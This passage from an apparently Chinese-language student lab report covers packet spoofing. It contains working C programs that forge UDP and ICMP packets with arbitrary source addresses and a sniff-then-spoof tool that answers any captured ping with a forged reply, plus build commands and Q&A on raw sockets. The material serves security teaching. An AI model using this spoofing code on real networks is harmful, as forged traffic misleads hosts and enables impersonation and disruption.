class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_info</span>;</span></span><br><span class="line">    <span class="type">int</span> enable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 1: Create a raw network socket.</span></span><br><span class="line">    <span class="type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sock: %d\n&quot;</span>, sock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 2: Set socket option.</span></span><br><span class="line">    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,</span><br><span class="line">           &amp;enable, <span class="keyword">sizeof</span>(enable));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 3: Provide needed information about destination.</span></span><br><span class="line">    dest_info.sin_family = AF_INET;</span><br><span class="line">    dest_info.sin_addr = ip-&gt;iph_destip;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 4: Send the packet out.</span></span><br><span class="line">    sendto(sock, ip, ntohs(ip-&gt;iph_len), <span class="number">0</span>,</span><br><span class="line">       (<span class="keyword">struct</span> sockaddr *)&amp;dest_info, <span class="keyword">sizeof</span>(dest_info));</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>spoof_udp.c:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myheader.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>   <span class="title function_">send_raw_ip_packet</span> <span class="params">(<span class="keyword">struct</span> ipheader* ip)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment">  Spoof a UDP packet using an arbitrary source IP Address and port</span></span><br><span class="line"><span class="comment">*******************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1500</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">1500</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *) buffer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">udpheader</span> *<span class="title">udp</span> =</span> (<span class="keyword">struct</span> udpheader *) (buffer +</span><br><span class="line">                                                 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 1: Fill in the UDP data field.</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">    <span class="type">char</span> *data = buffer + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader) +</span><br><span class="line">        <span class="keyword">sizeof</span>(<span class="keyword">struct</span> udpheader);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *msg = <span class="string">&quot;Hello Server!\n&quot;</span>;</span><br><span class="line">    <span class="type">int</span> data_len = <span class="built_in">strlen</span>(msg);</span><br><span class="line">    <span class="built_in">strncpy</span> (data, msg, data_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 2: Fill in the UDP header.</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">    udp-&gt;udp_sport = htons(<span class="number">12345</span>);</span><br><span class="line">    udp-&gt;udp_dport = htons(<span class="number">9090</span>);</span><br><span class="line">    udp-&gt;udp_ulen = htons(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> udpheader) + data_len);</span><br><span class="line">    udp-&gt;udp_sum =  <span class="number">0</span>; <span class="comment">/* Many OSes ignore this field, so we do not</span></span><br><span class="line"><span class="comment">                         calculate it. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 3: Fill in the IP header.</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">    ip-&gt;iph_ver = <span class="number">4</span>;</span><br><span class="line">    ip-&gt;iph_ihl = <span class="number">5</span>;</span><br><span class="line">    ip-&gt;iph_ttl = <span class="number">20</span>;</span><br><span class="line">    ip-&gt;iph_sourceip.s_addr = inet_addr(<span class="string">&quot;1.2.3.4&quot;</span>);</span><br><span class="line">    ip-&gt;iph_destip.s_addr = inet_addr(<span class="string">&quot;10.0.2.69&quot;</span>);</span><br><span class="line">    ip-&gt;iph_protocol = IPPROTO_UDP; <span class="comment">// The value is 17.</span></span><br><span class="line">    ip-&gt;iph_len = htons(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader) +</span><br><span class="line">                       <span class="keyword">sizeof</span>(<span class="keyword">struct</span> udpheader) + data_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 4: Finally, send the spoofed packet</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">    send_raw_ip_packet (ip);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用<strong>gcc -o spoof_udp spoof_udp.c spoof.c -lpcap</strong>编译，<strong>sudo .&#x2F;spoof_udp</strong>运行，查看后台wireshark，可以看到我们伪造的UDP包<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700471034070-d49d645f-ee88-4b72-ad3b-6e162d8d58c5.png#averageHue=%2365838e&clientId=u61735c7f-ffb4-4&from=paste&height=335&id=uc6e3f1bb&originHeight=527&originWidth=963&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=154313&status=done&style=none&taskId=ue16c6745-3165-4d46-b2d0-f7efaa784a2&title=&width=611.4285991954167" alt="image.png"><br><a name="tpNtR"></a></p>
<h4 id="Task-2-2B-Spoof-an-ICMP-Echo-Request"><a href="#Task-2-2B-Spoof-an-ICMP-Echo-Request" class="headerlink" title="Task 2.2B: Spoof an ICMP Echo Request"></a><strong>Task 2.2B: Spoof an ICMP Echo Request</strong></h4><p>这部分是伪造ICMP Echo请求。伪造的代码如下, 其中源IP10.9.0.5是局域网内另一个虚拟机的IP</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myheader.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="title function_">in_cksum</span> <span class="params">(<span class="type">unsigned</span> <span class="type">short</span> *buf, <span class="type">int</span> length)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_ip_packet</span><span class="params">(<span class="keyword">struct</span> ipheader* ip)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment">  Spoof an ICMP echo request using an arbitrary source IP Address</span></span><br><span class="line"><span class="comment">*******************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> buffer[<span class="number">1500</span>];</span><br><span class="line"></span><br><span class="line">   <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 1: Fill in the ICMP header.</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">icmpheader</span> *<span class="title">icmp</span> =</span> (<span class="keyword">struct</span> icmpheader *)</span><br><span class="line">                             (buffer + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader));</span><br><span class="line">   icmp-&gt;icmp_type = <span class="number">8</span>; <span class="comment">//ICMP Type: 8 is request, 0 is reply.</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// Calculate the checksum for integrity</span></span><br><span class="line">   icmp-&gt;icmp_chksum = <span class="number">0</span>;</span><br><span class="line">   icmp-&gt;icmp_chksum = in_cksum((<span class="type">unsigned</span> <span class="type">short</span> *)icmp,</span><br><span class="line">                                 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> icmpheader));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 2: Fill in the IP header.</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *) buffer;</span><br><span class="line">   ip-&gt;iph_ver = <span class="number">4</span>;</span><br><span class="line">   ip-&gt;iph_ihl = <span class="number">5</span>;</span><br><span class="line">   ip-&gt;iph_ttl = <span class="number">20</span>;</span><br><span class="line">   ip-&gt;iph_sourceip.s_addr = inet_addr(<span class="string">&quot;10.9.0.5&quot;</span>);</span><br><span class="line">   ip-&gt;iph_destip.s_addr = inet_addr(<span class="string">&quot;8.8.8.8&quot;</span>);</span><br><span class="line">   ip-&gt;iph_protocol = IPPROTO_ICMP;</span><br><span class="line">   ip-&gt;iph_len = htons(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader) +</span><br><span class="line">                       <span class="keyword">sizeof</span>(<span class="keyword">struct</span> icmpheader));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 3: Finally, send the spoofed packet</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">   send_raw_ip_packet (ip);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用gcc -o task22B task22B.c spoof.c checksum.c -lpcap 进行编译， sudo .&#x2F;task22B运行，查看后台的wireshark,如下：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700487218329-07997d80-5fe6-4e97-b87f-56651d7e7438.png#averageHue=%23262626&clientId=uc1ecd9fc-35b2-4&from=paste&height=81&id=u178b20e6&originHeight=128&originWidth=823&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=22993&status=done&style=none&taskId=uc7395484-42a1-4dc5-af76-0c8e637a2a8&title=&width=522.539706269811" alt="image.png"></p>
<p>可以看到我们发送的源IP为10.0.2.5, 目的IP为8.8.8.8的ICMP包<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700487434034-b1ddf585-1ad6-4cd1-a64e-bed3dec4a17c.png#averageHue=%23566f6f&clientId=uc1ecd9fc-35b2-4&from=paste&height=288&id=ucf61cddb&originHeight=454&originWidth=962&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=134976&status=done&style=none&taskId=uddf212ce-1ea1-4701-9b9d-79800fcb096&title=&width=610.7936785316624" alt="image.png"><br>:::info<br><strong>Q4: 是否可以将IP数据包长度字段设置为任意值，而不管实际的数据包有多大？</strong><br>:::<br>**A4: **不能将IP数据包长度字段设置为任意值而不考虑实际的数据包大小。IP数据包长度字段指示整个IP数据包的长度，包括IP报头和数据部分的总大小。IP协议要求IP数据包长度字段必须与实际数据包的大小一致。如果将IP数据包长度字段设置为错误的值，接收方将无法正确解析数据包，导致数据包被丢弃或引发错误。</p>
<p>:::info<br><strong>Q5: 使用原始套接字编程，是否需要计算IP报头的校验和？</strong><br>:::<br>**A5: **在使用原始套接字编程发送自定义的IP数据包时，通常需要计算并设置IP报头的校验和。IP报头的校验和是一种 用于验证IP数据包完整性的校验机制。它通过对IP报头字段进行计算，生成一个校验和值，并将该值填充到IP报头的校验和字段中。接收方在接收到数据包时会重新计算校验和，并与接收到的校验和字段进行比较，以检测数据包是否在传输过程中发生了损坏或篡改。</p>
<p>:::info<br><strong>Q6: 为什么您需要根权限来运行使用原始套接字的程序？如果没有根特权，程序在哪里失败</strong><br>:::<br><strong>A6:</strong> Linux系统中，原始套接字访问是受限的，并且通常需要根权限（也称为超级用户权限）才能够访问。这是为了确保系统的安全性和防止滥用。原始套接字允许程序直接访问网络层数据包，包括IP头部和传输层协议头部。这种低级别的网络访问可以用于实现各种网络工具和协议，例如网络扫描器、数据包嗅探器和网络安全工具等。如果没有根权限，程序在尝试使用原始套接字时通常会失败。这是因为操作系统对访问原始套接字进行了限制，只有具有足够权限的用户才能够执行这些操作。如果没有特权，操作系统会拒绝相关系统调用，返回权限错误或类似的错误消息。</p>
<p><a name="CeARc"></a></p>
<h3 id="4-3-Task-2-3-Sniff-and-then-Spoof"><a href="#4-3-Task-2-3-Sniff-and-then-Spoof" class="headerlink" title="4.3 Task 2.3: Sniff and then Spoof"></a><strong>4.3 Task 2.3: Sniff and then Spoof</strong></h3><blockquote>
<p>在此任务中，您将结合嗅探和欺骗技术来实现以下嗅探和欺骗程序。你需要在同一局域网上的两台机器。从机器A，你ping一个IP X。这将生成一个ICMP回波请求包。如果X是活动的，ping程序将收到一个回声响应，并打印出响应。你的嗅探和欺骗程序运行在攻击者的机器上，它通过数据包嗅探来监视局域网。当它看到ICMP echo请求时，无论目标IP地址是什么，您的程序应该立即使用包欺骗技术发送回声回复。因此，无论机器X是否活动，ping程序都将始终收到一个回复，表明X是活动的。您需要用C语言编写这样一个程序，并在报告中包含屏幕截图，以显示您的程序是工作的。请在您的报告中附上代码（有足够的内容）。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myheader.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">got_packet</span><span class="params">(u_char *args, <span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *header,</span></span><br><span class="line"><span class="params">                              <span class="type">const</span> u_char *packet)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethheader</span> *<span class="title">eth</span> =</span> (<span class="keyword">struct</span> ethheader *)packet;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ntohs(eth-&gt;ether_type) == <span class="number">0x0800</span>) &#123; <span class="comment">// 0x0800 is IP type</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> * <span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *)</span><br><span class="line">                           (packet + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ethheader));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;From: %s &quot;</span>, inet_ntoa(ip-&gt;iph_sourceip));   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;To: %s &quot;</span>, inet_ntoa(ip-&gt;iph_destip));</span><br><span class="line">    <span class="keyword">if</span> (ip-&gt;iph_protocol == IPPROTO_ICMP)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;protocal: ICMP\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;protocal: Others\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmpheader</span> *<span class="title">icmp_pkt</span> =</span> (<span class="keyword">struct</span> icmpheader *)(packet + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ethheader)</span><br><span class="line">                                                               + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ip-&gt;iph_protocol == IPPROTO_ICMP) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> buffer[<span class="number">1500</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">             Step 1: Fill in the ICMP header.</span></span><br><span class="line"><span class="comment">            ********************************************************/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">icmpheader</span> *<span class="title">icmp</span> =</span> (<span class="keyword">struct</span> icmpheader *)</span><br><span class="line">                                    (buffer + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader));</span><br><span class="line">        icmp-&gt;icmp_type = <span class="number">0</span>; <span class="comment">//ICMP Type: 8 is request, 0 is reply.</span></span><br><span class="line">        icmp-&gt;icmp_code = <span class="number">0</span>;</span><br><span class="line">        icmp-&gt;icmp_id   = icmp_pkt-&gt;icmp_id;</span><br><span class="line">        icmp-&gt;icmp_seq  = icmp_pkt-&gt;icmp_seq;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;icmp id: %d, seq: %d\n&quot;</span>, ntohs(icmp_pkt-&gt;icmp_id), ntohs(icmp_pkt-&gt;icmp_seq));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate the checksum for integrity</span></span><br><span class="line">        icmp-&gt;icmp_chksum = <span class="number">0</span>;</span><br><span class="line">        icmp-&gt;icmp_chksum = in_cksum((<span class="type">unsigned</span> <span class="type">short</span> *)icmp,</span><br><span class="line">                                        <span class="keyword">sizeof</span>(<span class="keyword">struct</span> icmpheader));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">             Step 2: Fill in the IP header.</span></span><br><span class="line"><span class="comment">            ********************************************************/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ipp</span> =</span> (<span class="keyword">struct</span> ipheader *) buffer;</span><br><span class="line">        ipp-&gt;iph_ver = <span class="number">4</span>;</span><br><span class="line">        ipp-&gt;iph_ihl = <span class="number">5</span>;</span><br><span class="line">        ipp-&gt;iph_ttl = <span class="number">64</span>;</span><br><span class="line">        ipp-&gt;iph_sourceip.s_addr = ip-&gt;iph_destip.s_addr;</span><br><span class="line">        ipp-&gt;iph_destip.s_addr = ip-&gt;iph_sourceip.s_addr;</span><br><span class="line">        ipp-&gt;iph_protocol = IPPROTO_ICMP;</span><br><span class="line">        ipp-&gt;iph_len = htons(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader) +</span><br><span class="line">                            <span class="keyword">sizeof</span>(<span class="keyword">struct</span> icmpheader));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send tt source :%s\n&quot;</span>, inet_ntoa(ipp-&gt;iph_sourceip));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send tt dest: %s\n&quot;</span>, inet_ntoa(ipp-&gt;iph_destip));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">             Step 3: Finally, send the spoofed packet</span></span><br><span class="line"><span class="comment">            ********************************************************/</span></span><br><span class="line">        <span class="comment">// icmp_pkt-&gt;icmp_type = 0;</span></span><br><span class="line">        <span class="comment">// icmp_pkt-&gt;icmp_code = 0;</span></span><br><span class="line">        <span class="comment">// icmp-&gt;icmp_chksum = 0;</span></span><br><span class="line">        <span class="comment">// icmp-&gt;icmp_chksum = in_cksum((unsigned short *)icmp,</span></span><br><span class="line">        <span class="comment">//                                 sizeof(struct icmpheader));</span></span><br><span class="line">        send_raw_ip_packet (ipp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pcap_t</span> *handle;</span><br><span class="line">  <span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">char</span> filter_exp[] = <span class="string">&quot;icmp[icmptype]==icmp-echo&quot;</span>;</span><br><span class="line">  bpf_u_int32 net;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 1: Open live pcap session on NIC with name enp0s3</span></span><br><span class="line">  handle = pcap_open_live(<span class="string">&quot;enp0s3&quot;</span>, BUFSIZ, <span class="number">1</span>, <span class="number">1000</span>, errbuf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;listening on network card, ret: %p...\n&quot;</span>, handle);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 2: Compile filter_exp into BPF psuedo-code</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;try to compile filter...\n&quot;</span>);</span><br><span class="line">  pcap_compile(handle, &amp;fp, filter_exp, <span class="number">0</span>, net);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;try to set filter...\n&quot;</span>);</span><br><span class="line">  pcap_setfilter(handle, &amp;fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 3: Capture packets</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;start to sniff...\n&quot;</span>);</span><br><span class="line">  pcap_loop(handle, <span class="number">-1</span>, got_packet, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  pcap_close(handle);   <span class="comment">//Close the handle</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gcc -o task23 task23.c checksum.c spoof.c -lpcap编译程序，sudo .&#x2F;task23运行<br />关闭网络，使用另一台机器ping 1.1.1.1，此机器运行上面的程序，结果如下：<br><a name="zaLDF"></a></p>
<h3 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700488293059-f1d92323-2c58-4242-b656-e222d9eebbc0.png#averageHue=%232c2c2c&clientId=ub5272dc8-70b2-4&from=paste&height=227&id=u19b2baa1&originHeight=357&originWidth=805&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=56021&status=done&style=none&taskId=u1661f04d-19b0-4269-82f2-16e4f391d1e&title=&width=511.1111343222331" alt="image.png"></h3><p>程序输出如下：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700488341385-889eeb7a-123d-4fda-ab32-ab7658e29481.png#averageHue=%23262626&clientId=ub5272dc8-70b2-4&from=paste&height=432&id=u8356152d&originHeight=681&originWidth=801&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=80108&status=done&style=none&taskId=ufe1ffdf1-cdeb-483f-81f9-8bd9afbc8c2&title=&width=508.5714516672158" alt="image.png"><br />要注意的是，程序中使用的inet_ntoa函数以字符串形式返回ip地址，该字符串存在函数内部的静态区域，下一次调用会刷新，之前的结果将会失效。</p>
